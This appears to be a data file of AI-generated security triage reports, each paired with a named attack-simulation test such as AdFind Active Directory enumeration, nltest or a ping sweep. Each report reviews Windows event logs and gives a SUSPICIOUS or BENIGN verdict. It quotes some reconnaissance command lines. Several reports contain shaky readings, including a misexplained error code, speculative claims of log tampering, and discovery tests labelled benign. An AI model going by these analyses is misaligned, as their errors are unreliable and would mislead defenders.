   - **SecurityHealthService.exe, wuauclt.exe, and MicrosoftEdgeUpdate.exe**: Operations are characteristic of routine system health and update management functions.

3. **Security Logs**:
   - Events 4624, 4672 show successful system logins and granting of special privileges to SYSTEM accounts. Common for system processes.
   - Event ID 5379 reflects attempts related to credential reading operations, which return an error (ReturnCode: 3221226021), typically signifying failed credential access or queries, possibly benign in the context of MicrosoftAccount user lookup failures.

4. **System Logs**:
   - Log entries for Windows Update Client relate to security intelligence updates being successfully processed, indicating normal Windows Defender updates.

5. **General Observations**:
   - There is an execution of processes related to Windows Update, security checks, and system health services, which all align with normal update operations.
   - The usage of **AdFind.exe** is slightly suspicious as it can be used for domain enumeration, raising some red flags, especially given its path in a temporary directory and the typical linked processes like cmd.exe in spearhead attacks.

**Assessment**:
- Most activities logged appear to be standard update and security operations performed by Windows system components.
- The execution of **AdFind.exe** by SERVER002\admin_test warrants further investigation. Specifically, to verify whether this execution was a result of a legitimate administrative task or if it signifies potentially unauthorized reconnaissance activity on the network.

**Resolution**:
- **SUSPICIOUS**: While there is a lot of benign and system-related activity, the usage of AdFind.exe from a temporary directory is unusual and warrants further investigation to ensure there is no ongoing or recent malicious activity that requires containment."
Wmic Group Discovery,"Upon analysis of the provided logs, here's a detailed breakdown of the events and their context:

1. **Application Log**: 
   - The log from ""Software Protection Platform Service"" is benign and does not indicate malicious activity.

2. **Sysmon Logs**:
   - Processes like `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe` are involved. These are legitimate Windows system programs.
   - `hostname.exe`: Used to display the hostname of the machine, executed with legitimate parameters.
   - `conhost.exe` instances: Associated with legitimate processes as parent processes like `hostname.exe` and `whoami.exe`. `conhost.exe` is a component of Windows Console, responsible for hosting command-line input processes.
   - `whoami.exe`: Fetches the current username; typically used by both administrators and scripts.
   - `wevtutil.exe`: Used frequently for managing Windows event logs, often legitimate in administrative contexts.
   - `wmic.exe` usage: No indication of suspicious activity since it was used to retrieve group names.
   - `cmd.exe`: Executed a `wmic` command to retrieve group names, which is not inherently suspicious if performed by an admin.
   - The repeated querying of system processes (like `wevtutil.exe` and `wmic.exe`) and user identity (`whoami.exe`) suggest monitoring or audit activity, which could be normal in an administrative context, but warrants a closer look to ensure it aligns with expected administrator behavior.

3. **System Log**:
   - Time change events via `svchost.exe` suggest that the system time was adjusted. This could be part of routine time synchronization activities. However, the near-simultaneous reverting of time adjustments (`NewTime < OldTime`) can sometimes be suspicious if not part of normal maintenance or synchronization processes.

4. **Security Logs**:
   - Corresponding security events also indicate time changes by `LOCAL SERVICE` under `svchost.exe`. Still, given the lack of any apparent cover-up (e.g., no deletion of logs, no user account changes, etc.) or associated forensic red flags, at this stage, it appears routine or benign.

### Conclusion:

- **Resolution**: **SUSPICIOUS**

Though mostly legitimate system binaries are involved, the high frequency and sequence of certain operations, especially involving `wevtutil.exe`, `whoami.exe`, and `wmic.exe`, correlate with audit or monitoring actions. Additionally, the time change events present a slight concern. Given these observations, it's advisable to:

1. **Verify**: Collaborate with system administrators to confirm whether these activities align with their actions or authorized scripts on the machine.
2. **Monitor**: Increase monitoring for additional anomalies, particularly checking for external access, file alterations, or escalated privileges that could be harmful.
3. **Audit Logs**: Ensure that log retention policies are keeping sufficient historical data if this needs to be correlated with additional data sources, like network logs.

This further investigation will help determine whether the activities observed are indeed harmless administrative actions or if they are symptomatic of a broader security concern requiring remediation."
Remote System Discovery - ping sweep,"Upon reviewing the provided Windows event logs, several activities stand out that warrant further analysis:

1. **PowerShell Activity:**
   - There are entries showing unusual uses of PowerShell with restricted execution policies. The commands executed display interaction with the Windows registry and system directories, particularly related to INF files. This behavior is not inherently malicious, as it can be used for system maintenance or administrative tasks, but it could also be indicative of reconnaissance or preparation for persistence by malicious actors.

2. **Sysmon Network Scanning:**
   - Numerous Sysmon entries demonstrate a high volume of sequential network pings (ping 192.168.1.x) executed through cmd.exe. The behavior is indicative of network scanning or reconnaissance activity commonly engaged by threat actors trying to map available hosts on a network.

3. **Multiple Logons and Privileged Activity:**
   - The logs contain a significant number of security log events related to logons and privilege escalations (Event ID 4672). An admin account, ""admin_test,"" appears to have performed actions with elevated privileges.

4. **Windows Update and Security Center Logs:**
   - These log entries appear normal, involving routine actions like Windows Defender being on and security intelligence updates for Microsoft Defender Antivirus. They do not raise any red flags.

5. **Unusual Process Executions:**
   - The frequent execution of conhost.exe and taskhostw.exe may seem unusual, but these processes are typically associated with standard Windows operations. However, their correlation with other behaviors might warrant additional scrutiny.

**Assessment:**
- The combination of suspicious PowerShell executions, extensive network scanning via ping, and multiple privilege use entries suggests abnormal behavior that could indicate preparatory steps of a cyber attack or attempted reconnaissance within the environment. However, without explicit evidence of data exfiltration or further exploit attempts, it remains difficult to pronounce this behavior as definitively malicious.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Investigate PowerShell Usage:** Review the full context and script contents of PowerShell commands executed, especially those related to INF files.
2. **Network Monitoring:** Investigate the source and intent behind network scanning activities to see if they align with known or authorized administrative tasks.
3. **Logon Event Review:** Check the origin and frequency of admin_test logons, focusing particularly on connections from external IPs.
4. **Conduct a Threat Hunt:** Look for potential indicators of compromise or persistence mechanisms leveraged by adversaries.
5. **Review Security Policies:** Ensure multi-factor authentication and stringent access controls are in place for all privileged accounts."
Windows Internal pktmon set filter,"### Analysis of Windows Event Logs

Upon reviewing the provided Windows Sysmon, System, and Security logs, several patterns and specific activity details are notable. Let's break them down:

#### Sysmon Log

1. **Process Activities**:
   - Several occurrences of processes being started, notably `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`.
   - `cmd.exe` execution with a command-line argument suggesting packet monitoring: `cmd.exe /c pktmon.exe filter add -p 445`.
   - Execution of `PktMon.exe` which is used for packet capture and monitoring network traffic.

2. **User Activity**:
   - All events were executed under `SERVER002\\admin_test` with high integrity level, suggesting administrative access.

3. **Command Line Details**:
   - The use of `pktmon.exe` with port `445` is notable. Port 445 is commonly associated with SMB (Server Message Block) protocol which can be a target for attacks or lateral movement within a network.

#### System Log

- **Time Change Events**:
  - There are logs indicating a time change (`EventID 1`). This might be routine NTP updates; however, setting system time back could potentially be leveraged to cover tracks in certain operations.

#### Security Log

- **Time Change Auditing**:
  - Corresponds with the system time change events, again suggesting possibly benign NTP-related updates, though it can also be used for manipulating event timestamps as a form of anti-forensics.

### Assessment

1. **Indicators of Potential Malicious Activity**:
   - The use of `wevtutil.exe` could suggest tampering with event logs for anti-forensics.
   - The execution of `pktmon.exe` aimed at network activity on port 445 could indicate network scanning or an attempt to capture traffic, possibly sniffing for credentials over SMB.

2. **Unusual and Suspicious Behavior**:
   - High-frequency execution of system utilities, particularly those involving command-line tools and network monitoring.
   - Changes in system time could potentially indicate an attempt to modify timestamps for obscuring traces.

### Final Resolution

Based on the analysis of the logs:

- The combination of utility executions (`wevtutil.exe`, `cmd.exe /c`, `pktmon.exe`), the high integrity level, and administrative user `admin_test` suggests planned and possibly unauthorized activity.
- While these activities alone do not confirm malware, they are consistent with behaviors that could be part of a larger unauthorized reconnaissance or data exfiltration strategy.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

- Conduct further investigation on the user `SERVER002\\admin_test` to confirm if the account's recent activities are documented and authorized.
- Review network traffic to ascertain if there were unauthorized access attempts or data exfiltration over SMB.
- Check for any other systems impacted based on interactions through port 445.
- Implement enhanced monitoring on the system for further suspicious activities, focusing on command-line utility use and network connections.
- If unauthorized behavior is confirmed, escalate to incident response for containment and remediation strategies."
Discover System Language with dism.exe,"### Detailed Analysis:

Upon reviewing the provided logs from the various Windows event channels (System, Application, Security, Windows PowerShell, and Sysmon), we note the following points:

#### System Logs:
1. **Time Change Events**:
   - Event IDs 24 and 1 under Kernel-General provider indicate time sync/adjustment events. The time on the system changes with calls to `svchost.exe`, which is typical for network time synchronization services. The `OldTime` and `NewTime` are adjusted within milliseconds, and this occurs in a short period.
   
2. **Time Service Event**:
   - The W32Time event logging time source synchronization is typical behavior for Windows devices when synchronizing with time servers, `time.windows.com`.

Overall, there are no immediate indicators of malicious activity from the system logs.

#### Application Logs:
1. **EdgeUpdate Service**:
   - The entries describe the normal stopping of an `EdgeUpdate` service. 

2. **SPP (Software Protection Platform) Event**:
   - Logs related to the Microsoft Software Protection Platform Service are benign, indicating a process linked to software activation and licensing compliance checks.

#### Security Logs:
1. **Privilege Escalation**:
   - Event ID 4672 shows granting of special privileges typically associated with a high-profile account named `admin_test`. This event is suspicious due to the highly sensitive privileges but needs to be contextualized with the environment's standard operations. If the `admin_test` account usage is consistent with regular administration tasks, this may not be concerning.

2. **Successful Logon / Type 3**:
   - There are logon events using the NTLM authentication method, typically seen in network logins. The `admin_test` account logons might need verification against expected activity patterns for remote access.

3. **Logoff Entries**:
   - Event ID 4634 corresponds to a logoff, which follows typical patterns of user activities.

#### Sysmon Logs:
1. **Process Executions**:
   - Frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `dism.exe` are observed, all executed by `admin_test`.
   - The use of `dism.exe` with arguments `/online /Get-Intl` suggests routine query interactions with the system image configuration, which could be an administrative task.
   
2. **Microsoft Edge Updates**:
   - Several processes related to `Microsoft Edge Update` are executed. This behavior can be normal as part of scheduled updates or installation checks.
   
3. **HOSTNAME and WHOAMI**:
   - The execution of `hostname.exe` and `whoami.exe` by an admin user is generally benign but may be double-checked to ensure it's consistent with typical administrative actions.

### Conclusion and Recommendation:

Based on the comprehensive review of logs across different channels, there are several suspicions, specifically around the elevation of privileges and authenticated logons from `admin_test`. However, these could all be benign in an administrative context. Unusual but likely benign actions include the execution of system utilities like `cmd.exe` and `dism.exe`. Overall, the activities correlate largely with administrative and system maintenance actions.

Given that the logs do not show clear evidence of malicious activity like known malware hashes, suspicious network behavior, or unauthorized process executions, I suggest more investigation. Specifically:
- Verify the legitimacy of the activities performed by the `admin_test` account.
- Ensure that the actions taken under this account align with standard administrative practices.
- Conduct a review of accounts with elevated privileges to ensure they are legitimate and secure.

**Resolution: SUSPICIOUS - Further Investigation Required**"

#### Sysmon Log Analysis

1. **Events Involving System Processes:**
   - Multiple entries show the execution of `TiWorker.exe`, `TrustedInstaller.exe`, and `SecurityHealthService.exe`, all running as `NT AUTHORITY\SYSTEM`. These processes are typically associated with legitimate Windows Update, servicing, and security services.

2. **Execution of PowerShell:**
   - EventRecordID 17993 indicates the execution of `powershell.exe` by the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, its use can be suspicious if unexpected or if the command arguments are unusual. The logs do not contain command-line arguments, making it difficult to assess intent.

3. **Frequent Usage of `wevtutil.exe`:**
   - This tool allows the management of event logs, which includes clearing logs, querying logs, etc. Frequent execution of `wevtutil.exe` by `SERVER002\admin_test` is unusual, especially when no legitimate reason is apparent.

4. **Execution of `conhost.exe`:**
   - Conhost is a support process for console windows (e.g., command prompt when run from PowerShell). The frequent logging entries related to `wevtutil.exe` and `conhost.exe` may indicate an attempt to manipulate or inspect logs.

5. **Suspicious Command Execution:**
   - EventRecordID 18023 details the execution of `cmd.exe` with a command line pointing to an `AdFind.exe` utility with parameters `-sc admincountdmp`. `AdFind` is a known tool for querying Active Directory and could be used for reconnaissance by an adversary.

#### Application Log Analysis

- Windows Defender logs indicate it is actively running (SECURITY_PRODUCT_STATE_ON). No concerning events such as detected threats were recorded.

#### Security Log Analysis

1. **Logon and Privilege Escalation:**
   - Events 30349 and 30350 show a service logon (LogonType 5, associated with a service start) as `SYSTEM`, accompanied by privileges granted to the account, which are typical for the SYSTEM account starting services (`SeDebugPrivilege`, etc.). No anomalies here, but context is essential for further analysis of SYSTEM account actions.

#### Conclusion and Recommendations

Based on this analysis:

- **Indicators of Potentially Suspicious Activity:**
  - The frequent execution of `wevtutil.exe` and `conhost.exe` by a non-SYSTEM user (`admin_test`).
  - Execution of `cmd.exe` running `AdFind.exe` suggests activities inconsistent with regular administrative tasks, hinting at possible reconnaissance attempts.

- **Benign Activity Noted:**
  - Standard Windows system processes running as SYSTEM without anomaly.
  - Windows Defender is operational.

**Resolution Assessment:** **SUSPICIOUS**

Given the `AdFind.exe` execution and unusual `wevtutil.exe` usage, investigation is necessary to understand the context and intent of these actions. Recommendations include:

1. **Isolate and Investigate:**
   - Verify the legitimacy of the `admin_test` account actions and any authorized administrative activities.
   - Investigate directory artefacts and scheduled tasks or scripts for unauthorized or unusual entries.

2. **Network and System Monitoring:**
   - Monitor network traffic from `Server002` for any suspicion of data exfiltration or command-and-control signals.

3. **Review Configuration and Permissions:**
   - Ensure adherence to the principle of least privilege on administrative accounts.
   - Evaluate and, if necessary, modify audit policies to provide more comprehensive logging of relevant event IDs.

In conclusion, while direct evidence of compromise is not present, the noted activities warrant further investigation to rule out malicious intent or unauthorized access."
Remote System Discovery - adidnsdump,"**Detailed Analysis:**

Reviewing the provided logs reveals a mix of routine and potentially suspicious activities.

1. **Routine Activities:**
   - Events involving Windows system processes like `CompatTelRunner.exe`, `taskhostw.exe`, and `svchost.exe`, which are typically related to system maintenance, updates, or telemetry, indicating benign background activities.
   - Regular operations of known Microsoft components such as `MicrosoftEdgeUpdate.exe`, `UsoClient.exe`, and `WindowsPowerShell` indicating scheduled updates or system health checks.
   - Installation logs for Python packages and related components via `MsiInstaller`, indicating software management, likely legitimate system maintenance duty.

2. **Suspicious Activities:**
   - **Command-Line Usage:** A command uses `cmd.exe` to execute a script (`adidnsdump`) with domain credentials (username `domain\\user` and a password), potentially indicating an attempt to gather DNS information, which could be an indicator of enumeration activity.
   - **PowerShell Usage:** A PowerShell script executed to download and run a Python installer from an external resource which, given the context of security and system integrity, can indicate initial stages of an intrusion or setup of a non-standard environment.
   - **External Downloads:** The PowerShell log indicates an attempt to download and execute a Python installation file from the internet (`https://www.python.org`), which may not be inherently malicious depending on context but warrants further review based on purpose and initiated user.
   
3. **Actors and Execution Context:**
   - Several instances of process execution by `SERVER002\\admin_test`, suggesting this user/account has been active and is involved both in routine and non-routine tasks. The legitimacy of these activities needs further verification.
   - The involvement of processes running under `NT AUTHORITY\\SYSTEM`, indicating potentially elevated privileges, is common for many system processes but needs observation if in conjunction with unexpected activity.

4. **Security and Privilege Events:**
   - Logs showing numerous credential operation events, with some resulting in `ReturnCode` indicative of failures or void attempts. While they align with background activities, ongoing tracking for anomalies could help identify irregular patterns or persistence attempts.
   - Privilege elevation logs indicate standard but powerful privileges assigned to the SYSTEM context, typical for server environments but attention is needed if leveraged unexpectedly.

**Assessment:**

Based on current analysis, several areas imply potential enumeration and environment adjustment activities executed over shell and scripting interfaces. Such patterns, specifically the downloading and installing external scripts, suggest a risk of unauthorized activity or preparatory steps for broader network operations, possibly toward lateral movement or privilege escalation.

**Resolution:**

**SUSPICIOUS** - The combination of:  
- Execution of potential DNS enumeration and Python downloads via command-line.  
- Involvement of `admin_test` user context initiating not just standard operations but also potentially risky activities.

These warrant a deeper investigation into the user's recent behavior, system changes, network traffic patterns, and added vigilance for possible indicators of lateral scope or further unauthorized accesses."
List Windows Firewall Rules,"### Detailed Analysis

Upon reviewing the provided logs, the following analysis and observations were made:

#### 1. Observations from Sysmon logs:
- A recurring pattern of processes including `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `netsh.exe` are executed by the user `SERVER002\\admin_test`.
- `wevtutil.exe` is a legitimate Windows process for managing event logs. However, its frequent usage, especially when paired with `conhost.exe`, can sometimes be indicative of malicious attempts to clear event logs or modify log settings, although this pattern alone doesn't confirm malice.
- The usage of commands like `whoami.exe` to check user information, and `cmd.exe netsh advfirewall firewall show rule name=all` suggests some administrative activities being performed. If this behavior is unexpected for the user account, it could be suspicious.

#### 2. Observations from Application, System and Security logs:
- Application logs confirm that Windows Defender is active and functioning normally.
- System logs show activities related to Windows Defender Antivirus updates which correspond to legitimate and common events.
- Security logs predominantly show failed credential access attempts, which typically indicate an unauthorized user trying to gain a higher level of access or unauthorized resource access, possibly intruding attempts using MicrosoftAccount details.

#### 3. Unusual Behavior and Indicators:
- Too many administrative commands executed in a very short period could signal automation or scripting, possibly indicating unauthorized configuration reviews or changes.
- There's no direct evidence of privilege escalation, but the combination of `cmd`, `whoami`, and firewall rule checks in quick succession under a supposed admin account might suggest reconnaissance or lateral movement actions.
- Failed credential access attempts (`EventID: 5379`) repeatedly attempting to access `MicrosoftAccount` credentials is suspicious, implying possible unauthorized access attempts or misconfigured scripts.

### Threats and Risks Identified:
- **Automated Reconnaissance or Potential Misuse**: Usage patterns of `cmd`, `netsh`, `wevtutil` and checking user identity through `whoami` can indicate reconnaissance activities by a potential insider threat or an external actor after breaching lesser secure access.
- **Unusual Credential Attempts**: Consistent failed credential access attempts could point towards a brute-force attempt or an enumeration of credentials, typically signs of potential compromise or preparatory steps for broader attack strategies.

### Conclusion and Resolution:
Based on the analysis, the activities observed in the logs fit the criteria for **SUSPICIOUS** activity primarily due to the unusual pattern of system command usage and failed credential access attempts. This warrants further investigation to determine the intent and the legitimacy of these actions taken under the `SERVER002\\admin_test` user account.

### Recommended Actions:
- **Review Activity Trends**: Conduct a historical analysis of the admin account's activity patterns to determine if this behavior is an anomaly.
- **Increase Monitoring**: Implement additional monitoring on `SERVER002` for any further unusual activities or unauthorized access attempts.
- **Conduct a Security Audit**: Review firewall rules, user rights, and permissions to ensure no unauthorized changes have been made.
- **Credential Safety Check**: Verify that no unauthorized changes are made to Microsoft account linked services and enhance credential policies if needed.
- **User Verification**: Confirm with the account holder about their activities during the timeframe of these event logs to ensure these were expected actions. 

Further forensic analysis may be necessary if continuous anomalies are detected."
Win32_PnPEntity Hardware Inventory,"Upon examining the provided Windows event logs, here is the detailed analysis:

### Sysmon Log:
The Sysmon logs capture various process creations, including executables such as `conhost.exe`, `wevtutil.exe`, `whoami.exe`, `MicrosoftEdgeUpdate.exe`, `hostname.exe`, `svchost.exe`, and `powershell.exe`.

1. **Frequent Execution of `conhost.exe`**:
   - Conhost.exe is launched frequently, associated with legitimate processes like PowerShell, which is expected behavior during command-line execution or script execution.
   - The usage of `-ForceV1` flag with conhost.exe is noted, which is uncommon but not necessarily malicious.

2. **`wevtutil.exe` Executions**:
   - Wevtutil is a legitimate tool used for event log management. Its frequent invocation could potentially indicate log manipulation or auditing activities, which can be suspicious if unexpected under normal circumstances.

3. **`powershell.exe` Usage**:
   - The PowerShell command involves retrieving information about PnP devices and manipulating the output. PowerShell is powerful and often exploited by attackers to perform various tasks, including reconnaissance or payload delivery.
   - The command used here seems benign as it gathers device information and organizes the output without clear malicious intent, but it warrants caution due to the potential for misuse.

4. **`whoami.exe` and `hostname.exe` Executions**:
   - These utility programs are used for gathering information about the current user and hostname, respectively. While frequent execution might hint at reconnaissance, they are run by the `admin_test` user, which might be part of normal operational checks.

### Windows PowerShell Log:
The PowerShell logs indicate the start and execution of a script that queries `Win32_PnPEntity` objects, matching the Sysmon logs. Although this script itself appears benign, the recurring usage of PowerShell could signal a need for further scrutiny to ensure no malicious scripts are executed concurrently.

### System Log:
The system logs primarily showcase time changes handled by `svchost.exe` processes, which are not abnormal. SPP (Software Protection Platform) service is also logged, reflecting routine licensing checks.

### Security Log:
The security logs show time synchronization events which align with the system log, suggesting these are legitimate time service operations.

### Assessment:
- **Suspicious Behavior**: Frequent use of PowerShell and certain flags (e.g., `-ForceV1` with `conhost.exe`) indicates actions that could be precursors to more harmful activity. The repeated use of `wevtutil.exe` might suggest attempts to manipulate logs or monitor logging, which can indicate either heightened security measures or attempts to cover tracks.
- **Benign Indicators**: Many executable launches are within normal operations if validated by current administrative tasks.
  
### Conclusion - Resolution: **SUSPICIOUS**

### Recommendations:
1. **Further Investigation**: Analyze what scripts or PowerShell commands are regularly run by the `admin_test` user. Verify the integrity and necessity of these scripts.
2. **Monitor and Audit Logs**: Increase scrutiny on activity involving `wevtutil.exe` and `powershell.exe`. Check if these correlate with legitimate admin operations.
3. **User Activity Verification**: Confirm `admin_test` user activities align with expected administrative behavior. 

These steps will help clarify whether current interventions are needed based on the identified suspicious activity."
operating system discovery,"After reviewing the provided Windows event logs, I have performed an analysis to determine the presence of any indicators of malicious activity. Let's break down the logs across different types:

1. **System Logs**:
    - The system logs primarily indicate time change events orchestrated by `svchost.exe` related to timezone and time synchronization services. These adjustments appear routine and originate from `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`. There are no suspicious entries or unusual process behavior within these logs.

2. **PowerShell Logs**:
    - The PowerShell logs show events indicating the initialization of various providers like Registry, Alias, Environment, etc., with the commands executed to retrieve basic system information (`Get-CimInstance Win32_OperatingSystem`). The command is focused on retrieving system details and appears benign. The absence of any complex, obfuscated, or suspicious command-line arguments strengthens the notion of this being routine activity.

3. **Security Logs**:
    - Security logs indicate time change events, consistent with the system logs. The `svchost.exe` process is assigned as the responsible process for these time synchronization tasks. This activity aligns with regular operations managed by the `LOCAL SERVICE` account and lacks any indication of suspicious privilege escalation or unauthorized access attempts.

4. **Sysmon Logs**:
    - Sysmon logs indicate the execution of common system utilities like `whoami.exe`, `wevtutil.exe`, and `hostname.exe`, as well as `powershell.exe` with benign command execution. The logs show these processes being run by an administrative user (`SERVER002\admin_test`), which, given the context of retrieving system information, seems legitimate and not unusual. Sysmon events do not reflect any processes launching unknown or potentially malicious executables.

5. **Application Logs**:
    - The application log entry relates to the Windows Software Protection Platform (`sppsvc.exe`), referring to routine software protection checks. This is typically related to licensing and activation services, predominantly routine and expected on Windows systems.

**Assessment**:
- The logs do not contain any clear indicators of compromise such as unauthorized access attempts, execution of unfamiliar or known malicious binaries, privilege escalation, or other actions typical of latent threats. The activities demonstrated within these logs are consistent with benign administrative and routine system operations.

**Resolution**: **BENIGN**

**Guidance**:
- Continue routine monitoring and auditing of logs for any future deviations or anomalies.
- Ensure all systems are up-to-date with patches to guard against potential vulnerabilities.
- Maintain robust security policies and user awareness training to mitigate any emergent threats.

Given the current evidence in the logs, there is no need for further investigation, as the activities recorded are aligned with legitimate system administrative functions."
Adfind - Enumerate Active Directory Trusts,"Upon reviewing the provided logs for the Windows host ""Server002,"" here are the key findings:

### Analysis:

1. **Legitimate System Processes:**
   - The events show several executions of system processes like `TrustedInstaller.exe`, `TiWorker.exe`, `SecurityHealthService.exe`, and frequent updates for Microsoft Edge. These executables are standard components of the Windows Operating System, dealing with updates, maintenance, and health services. Their operations under `NT AUTHORITY\SYSTEM` are typically expected during system updates or regular maintenance tasks.
  
2. **Use of PowerShell and cmd.exe:**
   - There are logged instances of `powershell.exe` and `cmd.exe` executed by the user `SERVER002\admin_test`. This is expected behavior for administrative tasks; however, the command line argument for `cmd.exe` includes execution of `AdFind.exe`, a utility often used for querying Active Directory:
     ```
     ""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe""  -gcb -sc trustdmp
     ```
   - The presence of `AdFind.exe` being used with such switch arguments can be associated with domain reconnaissance, which may indicate preparation for a larger attack if it is not related to a legitimate administrative purpose.

3. **Windows Event Utility (wevtutil.exe) Execution:**
   - Multiple instances of `wevtutil.exe` are executed by `SERVER002\admin_test`, potentially suggesting log querying or clearing actions. If not part of regular maintenance, this could be indicative of an attempt to hide unauthorized activities by cleaning logs.

4. **Microsoft Edge Updates:**
   - There are frequent updates and activity surrounding the Microsoft Edge Update process (`MicrosoftEdgeUpdate.exe`), which seems consistent with keeping software up to date. These processes run under `NT AUTHORITY\SYSTEM` and are a standard Windows operation.

5. **Security and System Logs:**
   - The security logs show a login with elevated privileges (Event ID 4672), indicating the use of high-level privileges at the time. This corresponds with other administrative activities, and if combined with unusual behavior, might merit closer scrutiny.

6. **Windows Defender Status:**
   - Reports indicate that Windows Defender is activated and running, providing an additional layer of malware protection and possibly hinting at a safe state or active monitoring by the system.

### Assessment:

- **Suspicious Activity:**
  - The execution of `AdFind.exe` for directory queries and multiple instances of `wevtutil.exe` usage under potentially obfuscating contexts present possible indicators of reconnaissance and log manipulation.

### Resolution:

- **SUSPICIOUS:** The logs contain activities that appear suspicious and warrant further investigation, primarily due to the use of `AdFind.exe` and `wevtutil.exe`. These could be benign administrative actions, but given their typical association with reconnaissance and potential log tampering techniques, they necessitate a deeper probe.

### Guidance:

- Verify with the user `admin_test` about the purposes for using `AdFind.exe` and if there were approved operational reasons.
- Cross-reference activity logs with any documented administrative actions or known maintenance operations.
- Monitor for any repeated or extended suspicious command line executions potentially indicative of further host reconnaissance.
- Review any additional network or external log data sources that could provide more insight into this user's activities and ascertain if there are any corresponding or corroborative external anomalies.
- Ensure continuous protection with Windows Defender and consider additional advanced threat protection solutions for proactive threat detection."
Remote System Discovery - nltest,"After reviewing the provided logs, here's the analysis:

1. **Application Logs**:
   - Windows Defender is operational, which is a healthy sign of the security posture of the system.

2. **Security Logs**:
   - Multiple Event ID 5379 entries indicate issues with credential handling for Microsoft Accounts. This may relate to unsuccessful attempts to retrieve credentials. The consistent `ReturnCode`: `3221226021` indicates a ""logon failure: the user has not been granted the requested logon type at this computer.""
   - Event ID 4624 and 4672 indicate a successful logon of the SYSTEM account and special privileges assigned. This is normal for system-level operations.

3. **System Logs**:
   - Several events related to Windows Update operations (Event IDs 43, 44) show updates are being applied, specifically for Microsoft Defender Antivirus. There are no issues here as regular update activity is expected.

4. **Sysmon Logs**:
   - There are multiple instances of process executions which are standard Windows utilities (e.g., `nltest.exe`, `whoami.exe`, `cmd.exe`, these are legitimate and commonly seen in administrative tasks).
   - There are logs of various system and update-related processes such as `wuauclt.exe`, `WaaSMedicAgent.exe`, `CompatTelRunner.exe`, `MicrosoftEdgeUpdate.exe`, etc. These indicate standard operational processes.
   - The processes are run as `NT AUTHORITY\SYSTEM`, which is expected for core Windows operations.

**Findings**:
- The logs primarily show typical system operations, including Windows updates and standard system utilities running.
- There is a high volume of Event ID 5379 entries, which can be unusual if not part of expected logon tasks or system operations.

**Assessment**:
- The behavior observed here is largely BENIGN as the majority of processes and events are consistent with standard operations of Windows system updates and maintenance tasks.
- The Event ID 5379 deserves a quick check to ensure the failed credential accesses align with expected applications or system operations, especially if unusual accounts are involved.

**Resolution**:
**BENIGN** - The logs do not contain any evident indicators of compromise or malicious activity, but the consistent occurrence of Event ID 5379 warrants confirmation for any potential misconfigurations or permission issues with credential access."
GetCurrent User with PowerShell Script,"Upon reviewing the provided log entries, the following analysis highlights key activities that may be indicative of suspicious or malicious behavior:

### Analysis of Security Logs:

1. **Logon Events (Event ID 4624):**
   - A successful logon event for SYSTEM user via Logon Type 5 is recorded. Logon Type 5 is typically associated with a service logon, which is a common and benign operation leading to a secure system environment. The process involved is `C:\Windows\System32\services.exe`, suggesting expected system behavior.

2. **Privilege Assignment (Event ID 4672):**
   - SYSTEM account received a series of high privileges, including `SeDebugPrivilege`, which is potent enough to symbolize higher risk activities such as debugging or manipulating system processes. Although SYSTEM obtaining these privileges is normal, it requires correlation with other activities.

3. **Credential Validation (Event ID 5379):**
   - Multiple credential validation attempts were made but returned code `3221226021`, indicative of status logon failure (specifically a failed authentication attempt). The `TargetName` shows attempts involving Microsoft accounts, while the process creation time commonality points to a recurring systemic operation or script.

### Analysis of PowerShell Logs:

- **PowerShell Usage:**
  - Registry and Alias activity via PowerShell signify scripts or tasks running, which included fetching the current user identity and outputting to a file `CurrentUserObject.txt`. Script execution with a system-level privilege could be considered unusual if not accounted for in operations, especially if generating user context files.

### Analysis of Sysmon Logs:

1. **Process Execution Patterns:**
   - Extensive Sysmon logging involving typical Windows processes (`conhost.exe`, `wevtutil.exe`, `wuauclt.exe`) generally align with system updates or legitimate administrative tasks, largely executed by `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`.
   - The invocation of tools like `whoami.exe` and creation of host-based identity files indicate activity involving user privilege checks or state validation, which can often script or manually initiated in the context of administrative tasks.

2. **File Hash Validation:**
   - All running instances have SHA256 hashes which are consistent with typical versions expected for Microsoft system files, suggesting integrity unless proved otherwise by a reputation service cross-check.

### Conclusion:

Upon detailed examination, the logs suggest a mixed routine of system administration and maintenance activities, possibly synchronized with legitimate system updates observed within the System logs. The SYSTEM account acquiring privileges is a regular operation, given there's no corroborating evidence of misuse or lateral movement. Similarly, the PowerShell activities, while scripted, align more with administrative or maintenance actions unless they have been scheduled unknown to the operations team.

**Resolution: SUSPICIOUS**

**Guidance:**
- Confirm with system administrators if the PowerShell scripts and tasks running matches scheduled maintenance activities or administrative tasks.
- Monitor further for continuous credential attempts (Event ID 5379) and validate scripts pushing user data to object files to avert potential security bypass or data leakage.
- Consider leveraging endpoint detection and response (EDR) for enhanced behavioral monitoring and possible investigation of alerts surrounding these events."
Adfind - Enumerate Active Directory Exchange AD Objects,"Upon analyzing the provided Windows event logs, I have identified several entries that could be concerning:

1. **Event ID 4672: Special Privileges Assigned** - This event indicates that accounts were granted special privileges, specifically the SYSTEM account. The privileges include `SeDebugPrivilege`, `SeTcbPrivilege`, and others that enable deep system access. While not inherently malicious, if misused, these privileges can be critical for an attacker.

2. **Event ID 4798: User Enumeration** - Multiple instances of this event show queries about the attributes of accounts such as `Administrator`, `admin_test`, `DefaultAccount`, etc., executed by `taskhostw.exe`. This could indicate reconnaissance activity, which is often a precursor to lateral movement or privilege escalation.

3. **Sysmon Logs: Execution of AdFind.exe** - The logs show an execution pattern where `cmd.exe` is used to run `AdFind.exe` with parameters like `-sc exchaddresses`. `AdFind.exe` is a known tool used to gather information from Active Directory. Its presence and execution in this context, especially from a temporary directory structure like `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`, is suspicious and might indicate malicious reconnaissance or data exfiltration activity.

4. **Multitude of Process Spawns** - Several instances where processes such as `wevtutil.exe`, `cmd.exe`, `conhost.exe`, and others were spawned by the same user `SERVER002\\admin_test`, with high integrity levels. This could be indicative of scripted automation often associated with post-exploit scenarios.

